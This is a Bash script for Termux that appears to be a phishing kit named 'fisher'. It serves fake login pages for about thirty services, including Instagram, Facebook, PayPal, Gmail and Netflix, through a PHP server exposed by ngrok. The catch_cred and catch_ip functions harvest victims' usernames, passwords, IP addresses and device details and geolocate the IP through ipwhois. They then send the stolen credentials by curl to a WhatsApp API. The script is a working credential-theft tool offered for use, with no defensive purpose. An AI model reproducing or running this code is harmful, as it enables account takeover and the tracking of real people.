###Internet And Process###
##CODED BY THE JATIN KALWAR
fix() {
cd $HOME/fisher/Additional
jtext=$(cat save.txt)
}
RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"

tank() {
 

echo -e "                   \e[31m▒\e[92m█\e[31m░░░ ▒\e[92m█▀▀▀█ \e[31m▒\e[92m█▀▀█ ▀█▀ \e[31m▒\e[92m█▄\e[31m░▒\e[92m█ "
echo -e "                   \e[31m▒\e[92m█\e[31m░░░ ▒\e[92m█\e[31m░░▒\e[92m█ \e[31m▒\e[92m█\e[31m░\e[92m▄▄ \e[31m▒\e[92m█\e[31m░ ▒\e[92m█\e[31m▒\e[92m█\e[31m▒\e[92m█"  
echo -e "                   \e[31m▒\e[92m█▄▄█ \e[31m▒\e[92m█▄▄▄█ \e[31m▒\e[92m█▄▄█ ▄█▄ \e[31m▒\e[92m█\e[31m░░\e[92m▀█"
echo ''





echo -e "\e[31mFill Your Details Correctly , It Will Help Us To Protect You From" | pv -qL 60
echo -e "\e[31m Tracing" | pv -qL 60
echo ''
echo -e  "\e[93mEnter Your Name:- " 
read jelly
echo $jelly >> save.txt
clear
echo ''
echo ''
echo ''
echo -e "\e[93mPlease Wait It Will Take Only Few Minutes. This Is Only One Time"
echo -e "\e[93mProcess After Install."
echo ''
cd $HOME/fisher/Additional
bash h1.sh
fix


}


naunt() {
FILE=$HOME/fisher/Additional/save.txt
if [ -f "$FILE" ]; then
fix

#cd $HOME/m-bomber2.O/Additional
#jtext=$(cat save.txt)
#echo $otext
else
tank
fi
}

cake() {
    
    
secret="update v1.1"
cd $HOME/fisher/Additional
ztext=$(cat update.txt)
if [[ $secret = $ztext ]];
then
cd $HOME/fisher/Additional
rm update.txt
bash update.sh
else
cd $HOME/fisher/Additional
rm update.txt
clear
naunt
fi
}

serveron() {
cd $HOME/fisher/Additional
serverup="On"
server=$(cat .server.txt)
rm .server.txt 
if [[ $server = $serverup ]]
then
echo ""
cake
else
clear
echo "              $BLUE ╭━━━┳━━━┳━━━┳━━━┳━━━╮ ╭╮╱╭┳━━━┳╮╱╭╮"
echo "              $CYAN ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃ ┃┃╱┃┃╭━╮┃┃╱┃┃"
echo "              $BLUE ┃╰━━┫╰━╯┃╰━╯┃┃╱┃┃╰━╯┃ ┃╰━╯┃┃┃┃┃╰━╯┃"
echo "              $CYAN ┃╭━━┫╭╮╭┫╭╮╭┫┃╱┃┃╭╮╭╯ ╰━━╮┃┃┃┃┣━━╮┃"
echo "              $BLUE ┃╰━━┫┃┃╰┫┃┃╰┫╰━╯┃┃┃╰╮ ╱╱╱┃┃╰━╯┃╱╱┃┃"
echo "              $CYAN ╰━━━┻╯╰━┻╯╰━┻━━━┻╯╰━╯ ╱╱╱╰┻━━━╯╱╱╰╯"
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer Jatin Kalwar !" | pv -qL 30
echo ""
exit
exit
exit
fi
    
    
}



upda() {
 
if [ -d "$HOME/fisher/Additional" ];
then
cd $HOME/fisher/Additional
rm fisher3.txt
elif [ -d "$HOME/fisher/Additional" ];
then
cd $HOME/fisher/Additional
rm fisher3.txt update.txt
else
echo
exit 1
fi
clear
cd $HOME
# While process is running...
echo ''
echo ''
echo -e '\e[92m'
echo -e "\e[92m               █▀▄▀█ █▀█\e[31m░    \e[92m█▄▀ ▄▀█ █\e[31m░░ \e[92m█\e[31m░\e[92m█\e[31m░\e[92m█ ▄▀█ █▀█\e[92m"
echo -e "\e[92m               █\e[31m░\e[92m▀\e[31m░\e[92m█ █▀▄ ▄   █\e[31m░\e[92m█ █▀█ █▄▄ ▀▄▀▄▀ █▀█ █▀▄\e[93m"
echo ''
echo ''






echo -e "  \e[92m∆ \e[93mFetching Files From github.com/jatinkalwar, Please Wait..."
sleep 0.5
git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null

cd $HOME
cd toolupdater/error 2> /dev/null
mv fisher3.txt $HOME/fisher/Additional 2> /dev/null
cd $HOME/toolupdater/Fisher 2> /dev/null
mv update.txt  .server.txt $HOME/fisher/Additional 2> /dev/null
cd $HOME
rm -rf toolupdater 2> /dev/null
serveron
}

DATE=$(date)
banner() {


clear
echo -e "\e[1;31m                       __,---//////////,        .///             "
echo -e "\e[1;31m                    ,-'  ) ) ) ) ) )''////_    /////             "
echo -e "\e[1;31m                 _,-' )) ) ) ) ) ) ) ) ) ) ) -.//////            "
echo -e "\e[1;31m                / ()_)\e[32mCODED BY THE JATIN KALWAR\e[1;31m//////            "

echo -e "\e[32m             ███████\e[1;31m╗\e[92m██\e[1;31m╗ \e[92m██████\e[1;31m╗\e[92m██\e[1;31m╗  \e[92m██\e[1;31m╗\e[92m███████\e[1;31m╗\e[92m██████\e[1;31m╗        "
echo -e "\e[92m             ██\e[1;31m╔════╝\e[92m██\e[1;31m║\e[92m██\e[1;31m╔════╝\e[92m██\e[1;31m║  \e[92m██\e[1;31m║\e[92m██\e[1;31m╔════╝\e[92m██\e[1;31m╔══\e[92m██\e[1;31m╗        "
echo -e "\e[92m             █████\e[1;31m╗ \e[92m ██\e[1;31m║╚\e[92m█████\e[1;31m╗ \e[92m███████\e[1;31m║\e[92m█████\e[1;31m╗  \e[92m██████\e[1;31m╔╝        "
echo -e "\e[92m             ██\e[1;31m╔══╝  \e[92m██\e[1;31m║ ╚═══\e[92m██\e[1;31m╗\e[92m██\e[1;31m╔══\e[92m██\e[1;31m║\e[92m██\e[1;31m╔══╝  \e[92m██\e[1;31m╔══\e[92m██\e[1;31m╗        "
echo -e "\e[92m             ██\e[1;31m║     \e[92m██\e[1;31m║\e[92m██████\e[1;31m╔╝\e[92m██\e[1;31m║  \e[92m██\e[1;31m║\e[92m███████\e[1;31m╗\e[92m██\e[1;31m║  \e[92m██\e[1;31m║        "
echo -e "\e[1;31m             ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        "
echo -e "     \e[92mINSTAGRAM:-\e[93m THE_JATIN_KALWARR      \e[92mSNAPCHAT:- \e[93mJATINN_KALWARR"
echo -e "                     \e[92m WHATSAPP:- \e[93m+994408609255"
echo ''
echo -e "                      \e[93mHey!! Welcome \e[32m$jtext \e[93mHacker"
echo ''
echo "$YELLOW✯ Started on $RED$DATE"
echo ''

}

servo() {
    
    wget -q --spider https://github.com/jatinkalwar

if [ $? -eq 0 ]; then
    upda
else
    clear
    ban
    sleep 1.0 
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi

}

servo
cd $HOME
rm -rf .ngrok2 > /dev/null 2>&1
cd $HOME/fisher

terminate(){
pingngrok=$(ps aux | grep -o "ngrok" | head -n1)
pingphp=$(ps aux | grep -o "php" | head -n1)
if [[ $pinggrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1                                                                                                                                                              
fi
if [[ $pingphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi
}
terminate
#speed=$(echo $(basename $(readlink -nf $0)))
#if [ "$speed" = "fisher.sh" ]
#then
#hunt=$(echo)
#else
#echo -n '' > fisher.sh
#fi
#issues () {
#pings=$(ech

  upd(){
if [ -d "$HOME/fisher" ];
then
cd $HOME
rm -rf fisher
elif [ -d "$HOME/fisher" ];
then
cd $HOME
rm -rf fisher
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mRECLONE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/jatinkalwar/fisher 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           RECLONE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd fisher
bash fisher.sh
}



menu() {
clear
banner

echo -e "\e[92m[\e[34m1\e[92m]\e[92m---\e[92mSTART\e[0m"
echo -e "\e[92m[\e[34m2\e[92m]\e[92m---\e[92mRECLONE\e[0m"
echo -e "\e[92m[\e[34m3\e[92m]\e[92m---\e[92mABOUT\e[0m"
echo -e "\e[92m[\e[34m4\e[92m]\e[92m---\e[92mMORE\e[0m"
echo -e "\e[92m[\e[34m5\e[92m]\e[92m---\e[92mACCESS KEY\e[0m"
echo -e "\e[92m[\e[34m6\e[92m]\e[92m---\e[92mRESTART\e[0m"
echo -e "\e[92m[\e[34m7\e[92m]\e[92m---\e[92mLOGOUT\e[0m"
echo -e "\e[92m[\e[34m0\e[92m]\e[92m---\e[92mEXIT\e[0m"
echo 
echo -ne "\e[92mSelect Option\e[0m: \e[92m" 
read iput
if [[ "$iput" = "1" || "$iput" = "one" ]];
then 
clear
banner
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 5 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read -p "ACCESS KEY: " access
cd $HOME/fisher/Additional

bks=$(cat fisher3.txt)
if [[ $access = $bks ]];
then 
clear
pagemenu
else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
fi
sleep 5.0
menu
elif [[ "$iput" = "2" || "$iput" = "two" ]];
then
upd
elif [[ "$iput" = "3" || "$iput" = "three" ]];
then
about
elif [[ "$iput" = "4" || "$iput" = "four" ]];
then
moremenu
elif [[ "$iput" = "5" || "$iput" = "five" ]];
then
banner
echo -e "\e[93mFOLLOW ME ON FACEBOOK AND GITHUB THEN SEND ME SCREENSHOT ON FACEBOOK OR WHATSAPP THEN I WILL GIVE YOU ACCESS KEY..." | pv -qL 10
sleep 5.0
am start -a android.intent.action.VIEW -d https://facebook.com/yourhackinghouse > /dev/null 2>&1
sleep 15.0
clear
ban
termux-open https://github.com/jatinkalwar
clear
menu
elif [[ "$iput" = "6" || "$iput" = "six" ]];
then
bash fisher.sh
elif [[ "$iput" = "7" || "$iput" = "seven" ]];
then
cd $HOME/fisher/Additional
rm save.txt
clear
banner
figlet LOGOUT | lolcat
echo 'BYE....... TATA.........' | lolcat
	
#elif [[ "$iput" = "8" || "$iput" = "eight" ]];
#then
#bash fisher.sh
elif [[ "$iput" = "0" || "$iput" = "Zero" ]];
then
exit 1
else
echo -e "\e[93m             You Typed It Wromg broooo.....\e[0m"
exit 1
fi
}

catch_cred() {
echo
account=$(cat $HOME/fisher/webs/$site/gmail.txt)
echo "$account" >> dump.creds.txt 2>&1
IFS=$'\n'
password=$(cat $HOME/fisher/webs/$site/pass.txt)
echo "$password" >> dump.creds.txt 2>&1
echo -e "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[0m\e[1;92m Account: \e[0m$account\e[0m"
echo -e "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[0m\e[1;92m Password: \e[0m$password\e[0m"
if [[ -f key.txt ]] && [[ -f num.txt ]]
then
tim=$(date +%D-%T)
datnum=$(cat num.txt)
datkey=$(cat key.txt)
whats=$(curl -s -l "http://api.callmebot.com/whatsapp.php?phone=$datnum&text=Account:$account%20||%20Pass:$password%20||%20Site:$site%20||%20Time:$tim%20&apikey=$datkey" 2>&1)
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Whatsapp Forward:\e[0m\e[1;0m Successfull"
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Saved:\e[0m\e[1;0m $site/dump.all.txt"
rm $HOME/fisher/webs/$site/pass.txt 2>&1
rm $HOME/fisher/webs/$site/gmail.txt 2>&1
rm $HOME/fisher/webs/$site/ip.txt 2>&1
checkfound
pkill -f -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
exit 1
else
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Whatsapp Forward:\e[0m\e[1;91m Off"
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Saved:\e[0m\e[1;0m $site/dump.all.txt"
rm $HOME/fisher/webs/$site/pass.txt 2>&1
rm $HOME/fisher/webs/$site/gmail.txt 2>&1
rm $HOME/fisher/webs/$site/ip.txt 2>&1
checkfound
pkill -f -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
exit 1
fi
}
pagemenu (){
banner
echo
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mInstagram\e[0m  \e[92m[\e[34m11\e[92m]\e[92m---\e[93mAirtelSim\e[0m   \e[92m[\e[34m21\e[92m]\e[92m---\e[93mWordpress\e[0m"
echo -e "  \e[92m[\e[34m2\e[92m]\e[92m---\e[93mFacebook\e[0m   \e[92m[\e[34m12\e[92m]\e[92m---\e[93mAmazon\e[0m      \e[92m[\e[34m22\e[92m]\e[92m---\e[93mJioRouter\e[0m"
echo -e "  \e[92m[\e[34m3\e[92m]\e[92m---\e[93mSociallub\e[0m  \e[92m[\e[34m13\e[92m]\e[92m---\e[93mApple\e[0m       \e[92m[\e[34m23\e[92m]\e[92m---\e[93mSnapchat\e[0m"
echo -e "  \e[92m[\e[34m4\e[92m]\e[92m---\e[93mNetflix\e[0m    \e[92m[\e[34m14\e[92m]\e[92m---\e[93mClasofclans\e[0m \e[92m[\e[34m24\e[92m]\e[92m---\e[93mOla\e[0m"
echo -e "  \e[92m[\e[34m5\e[92m]\e[92m---\e[93mTelegram\e[0m   \e[92m[\e[34m15\e[92m]\e[92m---\e[93mGoogle\e[0m      \e[92m[\e[34m25\e[92m]\e[92m---\e[93mPayPal\e[0m"
echo -e "  \e[92m[\e[34m6\e[92m]\e[92m---\e[93mYahoo\e[0m      \e[92m[\e[34m16\e[92m]\e[92m---\e[93mFreeFire\e[0m    \e[92m[\e[34m26\e[92m]\e[92m---\e[93mLinkedin\e[0m"
echo -e "  \e[92m[\e[34m7\e[92m]\e[92m---\e[93mYoutube\e[0m    \e[92m[\e[34m17\e[92m]\e[92m---\e[93mGithub\e[0m      \e[92m[\e[34m27\e[92m]\e[92m---\e[93mPlaystation\e[0m"
echo -e "  \e[92m[\e[34m8\e[92m]\e[92m---\e[93mXbox\e[0m       \e[92m[\e[34m18\e[92m]\e[92m---\e[93mGmail\e[0m       \e[92m[\e[34m28\e[92m]\e[92m---\e[93mPubg\e[0m"
echo -e "  \e[92m[\e[34m9\e[92m]\e[92m---\e[93mWifi\e[0m       \e[92m[\e[34m19\e[92m]\e[92m---\e[93mOutlook\e[0m     \e[92m[\e[34m29\e[92m]\e[92m---\e[93mShopify\e[0m"
echo -e "  \e[92m[\e[34m10\e[92m]\e[92m---\e[93mTwitter\e[0m   \e[92m[\e[34m20\e[92m]\e[92m---\e[93mSteam\e[0m       \e[92m[\e[34m30\e[92m]\e[92m---\e[93mSocialClub\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optio
if [[ "$optio" == "1" || "$optio" == "one" || "$optio" == "instagram" ]];
then
insmenu
elif [[ "$optio" == "2" || "$optio" == "two" || "$optio" == "facebook" ]]
then
fbmenu
elif [[ "$optio" == "3" || "$optio" == "three" || "$optio" == "socialclub" ]]
then
site="socialclub"
start
elif [[ "$optio" == "4" || "$optio" == "four" || "$optio" == "netflix" ]]
then
site="netflix"
start
elif [[ "$optio" == "5" || "$optio" == "five" || "$optio" == "telegram" ]] 
then
site="telegram"
start
elif [[ "$optio" == "6" || "$optio" == "six" || "$optio" == "yahoo" ]]
then
site="yahoo"
start
elif [[ "$optio" == "7" || "$optio" == "seven" || "$optio" == "youtube" ]]
then
site="youtube"
start
elif [[ "$optio" == "8" || "$optio" == "eight" || "$optio" == "xbox" ]]
then
site="xbox"
start
elif [[ "$optio" == "9" || "$optio" == "nine" || "$optio" == "wifi" ]]
then
site="wifi"
start
elif [[ "$optio" == "10" || "$optio" == "ten" || "$optio" == "twitter" ]]
then
site="twitter"
start
elif [[ "$optio" == "11" || "$optio" == "eleven" || "$optio" == "airtelsim" ]]
then
site="airtelsim"
start
elif [[ "$optio" == "12" || "$optio" == "twelve" || "$optio" == "amazon" ]]
then                                                                         
site="amazon"
start
elif [[ "$optio" == "13" || "$optio" == "thirteen" || "$optio" == "apple" ]]
then                                                                             
site="apple"
start
elif [[ "$optio" == "14" || "$optio" == "fourteen" || "$optio" == "clashofclans" ]]
then                                                                             
site="clashofclans"
start
elif [[ "$optio" == "15" || "$optio" == "fifteen" || "$optio" == "google" ]]
then                                                                             
gmenu
start
elif [[ "$optio" == "16" || "$optio" == "sixteen" || "$optio" == "freefire" ]]
then                                                                             
site="freefire"
start
elif [[ "$optio" == "17" || "$optio" == "seventeen" || "$optio" == "github" ]]
then
site="github"                                                                                                               
start
elif [[ "$optio" == "18" || "$optio" == "eighteen" || "$optio" == "gmail" ]]
then
site="gmail"                                                                                                               
start
elif [[ "$optio" == "19" || "$optio" == "ninteen" || "$optio" == "outlook" ]]
then
site="outlook"                                                                                                              
start
elif [[ "$optio" == "20" || "$optio" == "twenty" || "$optio" == "steam" ]]
then
site="steam"                                                                                                               
start
elif [[ "$optio" == "21" || "$optio" == "twentyone" || "$optio" == "wordpress" ]]
then
site="wordpress"                                                                                                               
start
elif [[ "$optio" == "22" || "$optio" == "twentytwo" || "$optio" == "jiorouter" ]]
then
site="jiorouter"                                                                                                               
start
elif [[ "$optio" == "23" || "$optio" == "twentythree" || "$optio" == "snapchat" ]]
then
site="snapchat"                                                                                                               
start
elif [[ "$optio" == "24" || "$optio" == "twentyfour" || "$optio" == "ola" ]]
then
site="ola"                                                                                                               
start
elif [[ "$optio" == "25" || "$optio" == "twentyfive" || "$optio" == "paypal" ]]
then
site="paypal"                                                                                                               
start
elif [[ "$optio" == "26" || "$optio" == "twentysix" || "$optio" == "linkedin" ]]
then
site="linkedin"                                                                                                               
start
elif [[ "$optio" == "27" || "$optio" == "twentyseven" || "$optio" == "playstation" ]]
then
site="playstation"                                                                                                               
start
elif [[ "$optio" == "28" || "$optio" == "twentyeight" || "$optio" == "pubg" ]]
then
site="pubg"                                                                                                               
start
elif [[ "$optio" == "29" || "$optio" == "twentynine" || "$optio" == "shopify" ]]
then
site="shopify"                                                                                                               
start
elif [[ "$optio" == "30" || "$optio" == "thirtee" || "$optio" == "socialclub" ]]
then
site="socialclub"                                                                                                               
start
elif [[ "$optio" == "00" || "$optio" == "back" || "$optio" == "0" ]]
then
banner
menu
fi
}

insmenu() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mInstagram\e[0m   \e[92m[\e[34m2\e[92m]\e[92m---\e[93mIGverify\e[0m   \e[92m[\e[34m3\e[92m]\e[92m---\e[93mIGfollowers\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optioz
if [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "instagram" ]];
then
site="instagram"
start
elif [[ "$optioz" == "2" || "$optioz" == "two" || "$optioz" == "instagram" ]];
then
site="igverify"
start
elif [[ "$optioz" == "3" || "$optioz" == "three" || "$optioz" == "instagram" ]];
then                                                                                                      
site="instafollowers"
start
fi
}

fbmenu() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mFacebook\e[0m   \e[92m[\e[34m2\e[92m]\e[92m---\e[93mFBpoll\e[0m   \e[92m[\e[34m3\e[92m]\e[92m---\e[93mFBsecurity\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optioz
if [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "facebook" ]];
then
site="facebook"
start
elif [[ "$optioz" == "2" || "$optioz" == "two" || "$optioz" == "facebook" ]];
then
site="fbpoll"
start
elif [[ "$optioz" == "3" || "$optioz" == "three" || "$optioz" == "facebook" ]];
then
site="fbsec"
start
fi
}

gmenu() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mGoogle\e[0m   \e[92m[\e[34m2\e[92m]\e[92m---\e[93mGooglepoll\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optioz
if [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "Google" ]];
then
site="googlenew"
start
elif [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "Google" ]];
then
site="googlepoll"
start
fi
}


getcredentials() {
echo ' '
printf "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m] Waiting for data ...\e[0m\n"
while [ true ]; do
if [[ -e "$HOME/fisher/webs/$site/gmail.txt" ]]; then
printf "\n\e[1;93m[\e[34m•\e[1;93m]\e[0m\e[1;92m Fetched Data Found!\n"
catch_cred
fi
sleep 1
done
}


checkfound() {
echo ' '
echo -e "\e[1;93m[\e[0m\e[34m•\e[0m\e[1;93m] Waiting for victim to open link...\e[0m\n"
echo ' '
#echo -e "\e[92m------------------------\e[91mVICTIM FOUND\e[92m-------------------------\e[0m"
while [ true ]; do
if [[ -e "$HOME/fisher/webs/$site/ip.txt" ]]; then
echo
echo -e "\e[92m------------------------\e[34mVICTIM FOUND\e[92m-------------------------\e[0m"
echo
echo -e  "\n\e[1;92m[\e[34m•\e[1;92m] Device info found..."
echo ' '
#echo -e "\e[92m------------------------\e[91mVICTIM FOUND\e[92m-------------------------\e[0m"
echo ' '
catch_ip
fi
sleep 1
done
}

catch_ip() {
ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  $HOME/fisher/webs/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' $HOME/fisher/webs/$site/ip.txt | cut -d '"' -f2)
echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m$ua\e[0m\e[1;77m\e[0m\n"
chk=$(fmt -20 $HOME/fisher/webs/$site/ip.txt)
sch=$(echo "$chk" > cod.txt)                                                                                                         
dom1=$(sed -n '5p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom2=$(sed -n '6p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom3=$(sed -n '7p' cod.txt | cut -d";" -f2 | cut -d")" -f1)
dom4=$(sed -n '11p' cod.txt | cut -d "/" -f1)
dom5=$(sed -n '11p' cod.txt | cut -d " " -f2 | cut -d"/" -f2)
dom6=$(sed -n '12p' cod.txt | cut -d"(" -f2 | cut -d")" -f1)
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Kernel:\e[1;0m$dom1\e[0m" 
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Os:\e[1;0m$dom2\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Model:\e[1;0m$dom3\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Browser:\e[0m$dom4\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Version:\e[1;0m$dom5\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m$dom6\e[0m"
cat $HOME/fisher/webs/$site/ip.txt >> $HOME/fisher/webs/$site/dump.ip.txt

if [[ -e location.txt ]]; then
rm -rf location.txt
fi

IFS='\n'
iptracker=$(curl -s -L "http://ipwhois.app/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
IFS=$'\n'
iptt=$(sed -n 's/"ip"://p' track.txt)

if [[ $iptt != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Device ip: \e[0m$iptt\e[0m"
fi

iptype=$(sed -n 's/"type"://p' track.txt)
if [[ $iptype != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] IP type: \e[0m$iptype\e[0m" 
fi

continent=$(sed -n 's/"continent"://p' track.txt)
if [[ $continent != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Continent: \e[0m$continent\e[0m" 
fi

country=$(sed -n 's/"country"://p' track.txt)
if [[ $country != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Country: \e[0m$country\e[0m"
fi

flag=$(sed -n 's/"country_flag"://p' track.txt)
if [[ $flag != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country flag: \e[0m$flag\e[0m"
fi

cap=$(sed -n 's/"country_capital"://p' track.txt)
if [[ $cap != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country capital: \e[0m$cap\e[0m"
fi

phon=$(sed -n 's/"country_phone"://p' track.txt)
if [[ $phon != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country code: \e[0m$phon\e[0m"
fi

region=$(sed -n 's/"region"://p' track.txt)
if [[ $region != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] State: \e[0m$region\e[0m"
fi

city=$(sed -n 's/"city"://p' track.txt)
if [[ $city != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] City: \e[0m$city\e[0m"
fi

isp=$(sed -n 's/"isp"://p' track.txt)
if [[ $isp != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Isp: \e[0m$isp\e[0m" 
fi

ccode=$(sed -n 's/"currency_code"://p' track.txt)
if [[ $ccode != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Currency code: \e[0m$ccode\e[0m"
fi

printf "\n" 
getcredentials

}



start() {                                                                                                             
#if [[ -e $HOME/prophish/webs/$site/ip.txt ]]; then                                                                    
#rm -rf webs/$site/ip.txt 2>&1                                                                                         
#fi

if [[ -e webs/$site/pass.txt ]]; then
rm -rf webs/$site/pass.txt 2>&1
fi

if [[ -e webs/$site/gmail.txt ]]; then
rm -rf webs/$site/gmail.txt 2>&1
fi

if [[ -e ngrok ]]; then
echo ""
else
echo
printf "\e[1;92m[\e[34m•\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm')
if [[ $arch == *'arm'* ]]; then
wget https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else                                                                                                                  
echo
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"                              
exit 1
fi
else
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1
if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1                                                                    
chmod +x ngrok                                                                                                       
rm -rf ngrok+wifi+data.zip
else
echo
printf "\e[1;93m[!] Unable to download \e[0m\n"
exit 1
fi                                                                                                                    
fi
fi                                                                                                                    


echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd $HOME/fisher/webs/$site && php -S 127.0.0.1:2222 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
./ngrok http 2222 > /dev/null 2>&1 &
sleep 10
